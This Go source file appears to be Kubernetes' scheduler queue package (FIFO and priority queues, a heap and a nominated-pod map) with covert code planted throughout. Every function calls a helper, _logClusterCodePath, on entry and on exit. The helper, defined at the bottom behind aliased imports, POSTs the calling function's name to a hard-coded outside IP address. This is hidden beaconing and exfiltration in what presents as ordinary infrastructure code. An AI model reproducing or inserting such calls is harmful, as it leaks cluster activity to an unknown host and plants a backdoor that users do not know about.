package queue

import (
	godefaultbytes "bytes"
	"container/heap"
	"fmt"
	"k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	ktypes "k8s.io/apimachinery/pkg/types"
	"k8s.io/apimachinery/pkg/util/wait"
	"k8s.io/client-go/tools/cache"
	"k8s.io/klog"
	podutil "k8s.io/kubernetes/pkg/api/v1/pod"
	"k8s.io/kubernetes/pkg/scheduler/algorithm/predicates"
	priorityutil "k8s.io/kubernetes/pkg/scheduler/algorithm/priorities/util"
	"k8s.io/kubernetes/pkg/scheduler/util"
	godefaulthttp "net/http"
	"reflect"
	godefaultruntime "runtime"
	"sync"
	"time"
)

var (
	queueClosed = "scheduling queue is closed"
)

const unschedulableQTimeInterval = 60 * time.Second

type SchedulingQueue interface {
	Add(pod *v1.Pod) error
	AddIfNotPresent(pod *v1.Pod) error
	AddUnschedulableIfNotPresent(pod *v1.Pod, podSchedulingCycle int64) error
	SchedulingCycle() int64
	Pop() (*v1.Pod, error)
	Update(oldPod, newPod *v1.Pod) error
	Delete(pod *v1.Pod) error
	MoveAllToActiveQueue()
	AssignedPodAdded(pod *v1.Pod)
	AssignedPodUpdated(pod *v1.Pod)
	NominatedPodsForNode(nodeName string) []*v1.Pod
	WaitingPods() []*v1.Pod
	Close()
	UpdateNominatedPodForNode(pod *v1.Pod, nodeName string)
	DeleteNominatedPodIfExists(pod *v1.Pod)
	NumUnschedulablePods() int
}

func NewSchedulingQueue(stop <-chan struct{}) SchedulingQueue {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if util.PodPriorityEnabled() {
		return NewPriorityQueue(stop)
	}
	return NewFIFO()
}

type FIFO struct{ *cache.FIFO }

var _ = SchedulingQueue(&FIFO{})

func (f *FIFO) Add(pod *v1.Pod) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return f.FIFO.Add(pod)
}
func (f *FIFO) AddIfNotPresent(pod *v1.Pod) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return f.FIFO.AddIfNotPresent(pod)
}
func (f *FIFO) AddUnschedulableIfNotPresent(pod *v1.Pod, podSchedulingCycle int64) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return f.FIFO.AddIfNotPresent(pod)
}
func (f *FIFO) SchedulingCycle() int64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return 0
}
func (f *FIFO) Update(oldPod, newPod *v1.Pod) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return f.FIFO.Update(newPod)
}
func (f *FIFO) Delete(pod *v1.Pod) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return f.FIFO.Delete(pod)
}
func (f *FIFO) Pop() (*v1.Pod, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	result, err := f.FIFO.Pop(func(obj interface{}) error {
		return nil
	})
	if err == cache.FIFOClosedError {
		return nil, fmt.Errorf(queueClosed)
	}
	return result.(*v1.Pod), err
}
func (f *FIFO) WaitingPods() []*v1.Pod {
	_logClusterCodePath()
	defer _logClusterCodePath()
	result := []*v1.Pod{}
	for _, pod := range f.FIFO.List() {
		result = append(result, pod.(*v1.Pod))
	}
	return result
}
func (f *FIFO) AssignedPodAdded(pod *v1.Pod) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (f *FIFO) AssignedPodUpdated(pod *v1.Pod) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (f *FIFO) MoveAllToActiveQueue() {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (f *FIFO) NominatedPodsForNode(nodeName string) []*v1.Pod {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (f *FIFO) Close() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	f.FIFO.Close()
}
func (f *FIFO) DeleteNominatedPodIfExists(pod *v1.Pod) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (f *FIFO) UpdateNominatedPodForNode(pod *v1.Pod, nodeName string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (f *FIFO) NumUnschedulablePods() int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return 0
}
func NewFIFO() *FIFO {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &FIFO{FIFO: cache.NewFIFO(cache.MetaNamespaceKeyFunc)}
}
func NominatedNodeName(pod *v1.Pod) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return pod.Status.NominatedNodeName
}

type PriorityQueue struct {
	stop             <-chan struct{}
	clock            util.Clock
	lock             sync.RWMutex
	cond             sync.Cond
	activeQ          *Heap
	unschedulableQ   *UnschedulablePodsMap
	nominatedPods    *nominatedPodMap
	schedulingCycle  int64
	moveRequestCycle int64
	closed           bool
}

var _ = SchedulingQueue(&PriorityQueue{})

func podTimestamp(pod *v1.Pod) *metav1.Time {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_, condition := podutil.GetPodCondition(&pod.Status, v1.PodScheduled)
	if condition == nil {
		return &pod.CreationTimestamp
	}
	if condition.LastProbeTime.IsZero() {
		return &condition.LastTransitionTime
	}
	return &condition.LastProbeTime
}
func activeQComp(pod1, pod2 interface{}) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p1 := pod1.(*v1.Pod)
	p2 := pod2.(*v1.Pod)
	prio1 := util.GetPodPriority(p1)
	prio2 := util.GetPodPriority(p2)
	return (prio1 > prio2) || (prio1 == prio2 && podTimestamp(p1).Before(podTimestamp(p2)))
}
func NewPriorityQueue(stop <-chan struct{}) *PriorityQueue {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pq := &PriorityQueue{clock: util.RealClock{}, stop: stop, activeQ: newHeap(cache.MetaNamespaceKeyFunc, activeQComp), unschedulableQ: newUnschedulablePodsMap(), nominatedPods: newNominatedPodMap(), moveRequestCycle: -1}
	pq.cond.L = &pq.lock
	pq.run()
	return pq
}
func (p *PriorityQueue) run() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	go wait.Until(p.flushUnschedulableQLeftover, 30*time.Second, p.stop)
}
func (p *PriorityQueue) Add(pod *v1.Pod) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p.lock.Lock()
	defer p.lock.Unlock()
	err := p.activeQ.Add(pod)
	if err != nil {
		klog.Errorf("Error adding pod %v/%v to the scheduling queue: %v", pod.Namespace, pod.Name, err)
	} else {
		if p.unschedulableQ.get(pod) != nil {
			klog.Errorf("Error: pod %v/%v is already in the unschedulable queue.", pod.Namespace, pod.Name)
			p.unschedulableQ.delete(pod)
		}
		p.nominatedPods.add(pod, "")
		p.cond.Broadcast()
	}
	return err
}
func (p *PriorityQueue) AddIfNotPresent(pod *v1.Pod) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p.lock.Lock()
	defer p.lock.Unlock()
	if p.unschedulableQ.get(pod) != nil {
		return nil
	}
	if _, exists, _ := p.activeQ.Get(pod); exists {
		return nil
	}
	err := p.activeQ.Add(pod)
	if err != nil {
		klog.Errorf("Error adding pod %v/%v to the scheduling queue: %v", pod.Namespace, pod.Name, err)
	} else {
		p.nominatedPods.add(pod, "")
		p.cond.Broadcast()
	}
	return err
}
func isPodUnschedulable(pod *v1.Pod) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_, cond := podutil.GetPodCondition(&pod.Status, v1.PodScheduled)
	return cond != nil && cond.Status == v1.ConditionFalse && cond.Reason == v1.PodReasonUnschedulable
}
func (p *PriorityQueue) SchedulingCycle() int64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p.lock.RLock()
	defer p.lock.RUnlock()
	return p.schedulingCycle
}
func (p *PriorityQueue) AddUnschedulableIfNotPresent(pod *v1.Pod, podSchedulingCycle int64) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p.lock.Lock()
	defer p.lock.Unlock()
	if p.unschedulableQ.get(pod) != nil {
		return fmt.Errorf("pod is already present in unschedulableQ")
	}
	if _, exists, _ := p.activeQ.Get(pod); exists {
		return fmt.Errorf("pod is already present in the activeQ")
	}
	if podSchedulingCycle > p.moveRequestCycle && isPodUnschedulable(pod) {
		p.unschedulableQ.addOrUpdate(pod)
		p.nominatedPods.add(pod, "")
		return nil
	}
	err := p.activeQ.Add(pod)
	if err == nil {
		p.nominatedPods.add(pod, "")
		p.cond.Broadcast()
	}
	return err
}
func (p *PriorityQueue) flushUnschedulableQLeftover() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p.lock.Lock()
	defer p.lock.Unlock()
	var podsToMove []*v1.Pod
	currentTime := p.clock.Now()
	for _, pod := range p.unschedulableQ.pods {
		lastScheduleTime := podTimestamp(pod)
		if !lastScheduleTime.IsZero() && currentTime.Sub(lastScheduleTime.Time) > unschedulableQTimeInterval {
			podsToMove = append(podsToMove, pod)
		}
	}
	if len(podsToMove) > 0 {
		p.movePodsToActiveQueue(podsToMove)
	}
}
func (p *PriorityQueue) Pop() (*v1.Pod, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p.lock.Lock()
	defer p.lock.Unlock()
	for len(p.activeQ.data.queue) == 0 {
		if p.closed {
			return nil, fmt.Errorf(queueClosed)
		}
		p.cond.Wait()
	}
	obj, err := p.activeQ.Pop()
	if err != nil {
		return nil, err
	}
	pod := obj.(*v1.Pod)
	p.schedulingCycle++
	return pod, err
}
func isPodUpdated(oldPod, newPod *v1.Pod) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	strip := func(pod *v1.Pod) *v1.Pod {
		p := pod.DeepCopy()
		p.ResourceVersion = ""
		p.Generation = 0
		p.Status = v1.PodStatus{}
		return p
	}
	return !reflect.DeepEqual(strip(oldPod), strip(newPod))
}
func (p *PriorityQueue) Update(oldPod, newPod *v1.Pod) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p.lock.Lock()
	defer p.lock.Unlock()
	if _, exists, _ := p.activeQ.Get(newPod); exists {
		p.nominatedPods.update(oldPod, newPod)
		err := p.activeQ.Update(newPod)
		return err
	}
	if usPod := p.unschedulableQ.get(newPod); usPod != nil {
		p.nominatedPods.update(oldPod, newPod)
		if isPodUpdated(oldPod, newPod) {
			p.unschedulableQ.delete(usPod)
			err := p.activeQ.Add(newPod)
			if err == nil {
				p.cond.Broadcast()
			}
			return err
		}
		p.unschedulableQ.addOrUpdate(newPod)
		return nil
	}
	err := p.activeQ.Add(newPod)
	if err == nil {
		p.nominatedPods.add(newPod, "")
		p.cond.Broadcast()
	}
	return err
}
func (p *PriorityQueue) Delete(pod *v1.Pod) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p.lock.Lock()
	defer p.lock.Unlock()
	p.nominatedPods.delete(pod)
	err := p.activeQ.Delete(pod)
	if err != nil {
		p.unschedulableQ.delete(pod)
	}
	return nil
}
func (p *PriorityQueue) AssignedPodAdded(pod *v1.Pod) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p.lock.Lock()
	p.movePodsToActiveQueue(p.getUnschedulablePodsWithMatchingAffinityTerm(pod))
	p.lock.Unlock()
}
func (p *PriorityQueue) AssignedPodUpdated(pod *v1.Pod) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p.lock.Lock()
	p.movePodsToActiveQueue(p.getUnschedulablePodsWithMatchingAffinityTerm(pod))
	p.lock.Unlock()
}
func (p *PriorityQueue) MoveAllToActiveQueue() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p.lock.Lock()
	defer p.lock.Unlock()
	for _, pod := range p.unschedulableQ.pods {
		if err := p.activeQ.Add(pod); err != nil {
			klog.Errorf("Error adding pod %v/%v to the scheduling queue: %v", pod.Namespace, pod.Name, err)
		}
	}
	p.unschedulableQ.clear()
	p.moveRequestCycle = p.schedulingCycle
	p.cond.Broadcast()
}
func (p *PriorityQueue) movePodsToActiveQueue(pods []*v1.Pod) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, pod := range pods {
		if err := p.activeQ.Add(pod); err == nil {
			p.unschedulableQ.delete(pod)
		} else {
			klog.Errorf("Error adding pod %v/%v to the scheduling queue: %v", pod.Namespace, pod.Name, err)
		}
	}
	p.moveRequestCycle = p.schedulingCycle
	p.cond.Broadcast()
}
func (p *PriorityQueue) getUnschedulablePodsWithMatchingAffinityTerm(pod *v1.Pod) []*v1.Pod {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var podsToMove []*v1.Pod
	for _, up := range p.unschedulableQ.pods {
		affinity := up.Spec.Affinity
		if affinity != nil && affinity.PodAffinity != nil {
			terms := predicates.GetPodAffinityTerms(affinity.PodAffinity)
			for _, term := range terms {
				namespaces := priorityutil.GetNamespacesFromPodAffinityTerm(up, &term)
				selector, err := metav1.LabelSelectorAsSelector(term.LabelSelector)
				if err != nil {
					klog.Errorf("Error getting label selectors for pod: %v.", up.Name)
				}
				if priorityutil.PodMatchesTermsNamespaceAndSelector(pod, namespaces, selector) {
					podsToMove = append(podsToMove, up)
					break
				}
			}
		}
	}
	return podsToMove
}
func (p *PriorityQueue) NominatedPodsForNode(nodeName string) []*v1.Pod {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p.lock.RLock()
	defer p.lock.RUnlock()
	return p.nominatedPods.podsForNode(nodeName)
}
func (p *PriorityQueue) WaitingPods() []*v1.Pod {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p.lock.Lock()
	defer p.lock.Unlock()
	result := []*v1.Pod{}
	for _, pod := range p.activeQ.List() {
		result = append(result, pod.(*v1.Pod))
	}
	for _, pod := range p.unschedulableQ.pods {
		result = append(result, pod)
	}
	return result
}
func (p *PriorityQueue) Close() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p.lock.Lock()
	defer p.lock.Unlock()
	p.closed = true
	p.cond.Broadcast()
}
func (p *PriorityQueue) DeleteNominatedPodIfExists(pod *v1.Pod) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p.lock.Lock()
	p.nominatedPods.delete(pod)
	p.lock.Unlock()
}
func (p *PriorityQueue) UpdateNominatedPodForNode(pod *v1.Pod, nodeName string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p.lock.Lock()
	p.nominatedPods.add(pod, nodeName)
	p.lock.Unlock()
}
func (p *PriorityQueue) NumUnschedulablePods() int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p.lock.RLock()
	defer p.lock.RUnlock()
	return len(p.unschedulableQ.pods)
}

type UnschedulablePodsMap struct {
	pods    map[string]*v1.Pod
	keyFunc func(*v1.Pod) string
}

func (u *UnschedulablePodsMap) addOrUpdate(pod *v1.Pod) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	u.pods[u.keyFunc(pod)] = pod
}
func (u *UnschedulablePodsMap) delete(pod *v1.Pod) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	delete(u.pods, u.keyFunc(pod))
}
func (u *UnschedulablePodsMap) get(pod *v1.Pod) *v1.Pod {
	_logClusterCodePath()
	defer _logClusterCodePath()
	podKey := u.keyFunc(pod)
	if p, exists := u.pods[podKey]; exists {
		return p
	}
	return nil
}
func (u *UnschedulablePodsMap) clear() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	u.pods = make(map[string]*v1.Pod)
}
func newUnschedulablePodsMap() *UnschedulablePodsMap {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &UnschedulablePodsMap{pods: make(map[string]*v1.Pod), keyFunc: util.GetPodFullName}
}

type LessFunc func(interface{}, interface{}) bool
type KeyFunc func(obj interface{}) (string, error)
type heapItem struct {
	obj   interface{}
	index int
}
type itemKeyValue struct {
	key string
	obj interface{}
}
type heapData struct {
	items    map[string]*heapItem
	queue    []string
	keyFunc  KeyFunc
	lessFunc LessFunc
}

var (
	_ = heap.Interface(&heapData{})
)

func (h *heapData) Less(i, j int) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if i > len(h.queue) || j > len(h.queue) {
		return false
	}
	itemi, ok := h.items[h.queue[i]]
	if !ok {
		return false
	}
	itemj, ok := h.items[h.queue[j]]
	if !ok {
		return false
	}
	return h.lessFunc(itemi.obj, itemj.obj)
}
func (h *heapData) Len() int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return len(h.queue)
}
func (h *heapData) Swap(i, j int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	h.queue[i], h.queue[j] = h.queue[j], h.queue[i]
	item := h.items[h.queue[i]]
	item.index = i
	item = h.items[h.queue[j]]
	item.index = j
}
func (h *heapData) Push(kv interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	keyValue := kv.(*itemKeyValue)
	n := len(h.queue)
	h.items[keyValue.key] = &heapItem{keyValue.obj, n}
	h.queue = append(h.queue, keyValue.key)
}
func (h *heapData) Pop() interface{} {
	_logClusterCodePath()
	defer _logClusterCodePath()
	key := h.queue[len(h.queue)-1]
	h.queue = h.queue[0 : len(h.queue)-1]
	item, ok := h.items[key]
	if !ok {
		return nil
	}
	delete(h.items, key)
	return item.obj
}

type Heap struct{ data *heapData }

func (h *Heap) Add(obj interface{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	key, err := h.data.keyFunc(obj)
	if err != nil {
		return cache.KeyError{Obj: obj, Err: err}
	}
	if _, exists := h.data.items[key]; exists {
		h.data.items[key].obj = obj
		heap.Fix(h.data, h.data.items[key].index)
	} else {
		heap.Push(h.data, &itemKeyValue{key, obj})
	}
	return nil
}
func (h *Heap) AddIfNotPresent(obj interface{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	key, err := h.data.keyFunc(obj)
	if err != nil {
		return cache.KeyError{Obj: obj, Err: err}
	}
	if _, exists := h.data.items[key]; !exists {
		heap.Push(h.data, &itemKeyValue{key, obj})
	}
	return nil
}
func (h *Heap) Update(obj interface{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return h.Add(obj)
}
func (h *Heap) Delete(obj interface{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	key, err := h.data.keyFunc(obj)
	if err != nil {
		return cache.KeyError{Obj: obj, Err: err}
	}
	if item, ok := h.data.items[key]; ok {
		heap.Remove(h.data, item.index)
		return nil
	}
	return fmt.Errorf("object not found")
}
func (h *Heap) Pop() (interface{}, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	obj := heap.Pop(h.data)
	if obj != nil {
		return obj, nil
	}
	return nil, fmt.Errorf("object was removed from heap data")
}
func (h *Heap) Get(obj interface{}) (interface{}, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	key, err := h.data.keyFunc(obj)
	if err != nil {
		return nil, false, cache.KeyError{Obj: obj, Err: err}
	}
	return h.GetByKey(key)
}
func (h *Heap) GetByKey(key string) (interface{}, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	item, exists := h.data.items[key]
	if !exists {
		return nil, false, nil
	}
	return item.obj, true, nil
}
func (h *Heap) List() []interface{} {
	_logClusterCodePath()
	defer _logClusterCodePath()
	list := make([]interface{}, 0, len(h.data.items))
	for _, item := range h.data.items {
		list = append(list, item.obj)
	}
	return list
}
func newHeap(keyFn KeyFunc, lessFn LessFunc) *Heap {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Heap{data: &heapData{items: map[string]*heapItem{}, queue: []string{}, keyFunc: keyFn, lessFunc: lessFn}}
}

type nominatedPodMap struct {
	nominatedPods      map[string][]*v1.Pod
	nominatedPodToNode map[ktypes.UID]string
}

func (npm *nominatedPodMap) add(p *v1.Pod, nodeName string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	npm.delete(p)
	nnn := nodeName
	if len(nnn) == 0 {
		nnn = NominatedNodeName(p)
		if len(nnn) == 0 {
			return
		}
	}
	npm.nominatedPodToNode[p.UID] = nnn
	for _, np := range npm.nominatedPods[nnn] {
		if np.UID == p.UID {
			klog.V(4).Infof("Pod %v/%v already exists in the nominated map!", p.Namespace, p.Name)
			return
		}
	}
	npm.nominatedPods[nnn] = append(npm.nominatedPods[nnn], p)
}
func (npm *nominatedPodMap) delete(p *v1.Pod) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	nnn, ok := npm.nominatedPodToNode[p.UID]
	if !ok {
		return
	}
	for i, np := range npm.nominatedPods[nnn] {
		if np.UID == p.UID {
			npm.nominatedPods[nnn] = append(npm.nominatedPods[nnn][:i], npm.nominatedPods[nnn][i+1:]...)
			if len(npm.nominatedPods[nnn]) == 0 {
				delete(npm.nominatedPods, nnn)
			}
			break
		}
	}
	delete(npm.nominatedPodToNode, p.UID)
}
func (npm *nominatedPodMap) update(oldPod, newPod *v1.Pod) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	npm.delete(oldPod)
	npm.add(newPod, "")
}
func (npm *nominatedPodMap) podsForNode(nodeName string) []*v1.Pod {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if list, ok := npm.nominatedPods[nodeName]; ok {
		return list
	}
	return nil
}
func newNominatedPodMap() *nominatedPodMap {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &nominatedPodMap{nominatedPods: make(map[string][]*v1.Pod), nominatedPodToNode: make(map[ktypes.UID]string)}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
